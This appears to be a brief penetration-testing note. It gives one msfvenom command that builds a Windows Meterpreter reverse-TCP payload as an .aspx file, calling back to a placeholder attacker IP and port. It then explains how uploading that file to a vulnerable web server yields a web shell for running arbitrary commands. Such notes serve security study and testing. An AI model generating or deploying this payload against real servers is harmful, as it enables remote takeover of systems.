
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f aspx -o shell.aspx

execute arbitrary code/commands 



Web Shell Access: Attackers or testers upload an .aspx file to a vulnerable web server to establish a "web shell". Once uploaded to a web-accessible directory, the attacker can visit the URL (e.g., target.com) to 
execute arbitrary commands on the server.
